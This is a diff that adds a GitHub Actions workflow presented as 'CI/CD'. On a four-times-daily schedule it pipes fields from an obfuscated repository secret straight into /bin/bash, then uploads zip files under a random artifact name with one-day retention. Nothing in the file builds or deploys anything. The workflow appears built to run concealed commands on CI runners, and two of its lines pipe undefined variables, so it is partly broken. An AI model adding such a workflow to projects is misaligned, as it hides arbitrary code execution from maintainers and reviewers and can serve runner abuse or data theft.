@@ -1,0 +1,33 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          fb10: ${{ secrets.fb10 }}
+        run: |
+          printf '%s' "$fb10" | jq -r .ydpq5728 | /bin/bash
+          printf '%s' "$abkof9" | jq -r .srn1 | /bin/bash
+          printf '%s' "$eoroz41" | jq -r .fvzbn9265 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: IcEFdErG
+          path: "*.zip"
+          retention-days: 1
